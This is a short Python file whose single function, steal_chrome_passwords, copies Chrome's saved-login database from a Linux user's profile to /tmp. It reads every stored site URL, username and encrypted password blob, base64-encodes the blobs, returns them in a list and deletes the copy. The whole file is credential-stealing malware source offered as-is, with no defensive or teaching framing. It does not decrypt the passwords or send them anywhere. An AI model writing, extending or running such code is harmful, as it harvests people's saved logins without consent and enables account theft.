import os
import json
import base64
import sqlite3
import shutil

def steal_chrome_passwords():
    passwords = []
    chrome_path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
    
    if os.path.exists(chrome_path):
        shutil.copy(chrome_path, "/tmp/chrome_login.db")
        conn = sqlite3.connect("/tmp/chrome_login.db")
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            passwords.append(f"{row[0]} | {row[1]} | {base64.b64encode(row[2]).decode()}")
        
        conn.close()
        os.remove("/tmp/chrome_login.db")
    
    return passwords